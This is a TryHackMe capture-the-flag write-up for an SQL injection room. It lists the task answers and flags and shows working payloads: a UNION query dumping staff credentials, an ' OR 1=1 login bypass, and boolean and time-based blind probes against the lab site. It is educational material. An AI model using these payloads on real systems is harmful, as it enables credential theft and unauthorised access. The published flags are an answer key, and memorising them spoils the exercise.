---
title: SQL Injection  
author: CYB3RM3
name: CYB3RM3 | SQL Injection  
date: 2021-10-17 13:05:07 +0100
categories: [TryHackMe, Web]
tags: [Web, SQLi]
---

Learn how to detect and exploit SQL Injection vulnerabilities

THM Room [https://tryhackme.com/room/sqlinjectionlm](https://tryhackme.com/room/sqlinjectionlm)


## TASK 1 : Brief
### What does SQL stand for?
Answer : Structured Query Language

## TASK 2 : What is a Database?  
### What is the acronym for the software that controls a database?
Answer : DBMS

### What is the name of the grid-like structure which holds the data?
Answer : table

## TASK 3 : What is SQL? 
### What SQL statement is used to retrieve data?
Answer : SELECT

### What SQL clause can be used to retrieve data from multiple tables?
Answer : UNION

### What SQL statement is used to add data?
Answer : INSERT

## TASK 4 : What is SQL Injection?  
### What character signifies the end of an SQL query?
Answer : semicolon ";"

## TASK 5 : In-Band SQLi 
### What is the flag after completing level 1 ?
Read the text and follow the instructions.

The final query you'll use should be :

```sql
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
{: .nolineno }

Answer : THM{SQL_INJECTION_3840}

## TASK 6 : Blind SQLi - Authentication Bypass
### What is the flag after completing level two? (and moving to level 3)

The payload to use in the password field is :

```sql
' OR 1=1;--
```
{: .nolineno }

Answer : THM{SQL_INJECTION_9581}

## TASK 7 : Blind SQLi - Boolean Based 
### What is the flag after completing level three?

I follow the steps of enumeration discribe and the last injection is

```sql
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin%' and password like '3845%';--
```
{: .nolineno }

Answer : THM{SQL_INJECTION_1093}

## TASK 8 : Blind SQLi - Time Based 
### What is the final flag after completing level four?

For this one, you have to repeat the process learnt in the TASK 7. I found the number of columns with :

```sql
admin123' UNION SELECT SLEEP(5),2;--
```
{: .nolineno }

Then, i got the database name : sqli_four. when you repeat all the steps you'll find the table name and the comumns.

The final query should be :

```sql
https://website.thm/checkuser?username=admin123' UNION SELECT sleep(2),2 from users where username='admin' and password like '4961%;--
```
{: .nolineno }

Answer : THM{SQL_INJECTION_MASTER}

## TASK 9 : Out-of-Band SQLi 
### Name a protocol beginning with D that can be used to exfiltrate data from a database.
Answer : DNS

## TASK 10 : Remediation
### Name a method of protecting yourself from an SQL Injection exploit.
Answer : Prepared Statements
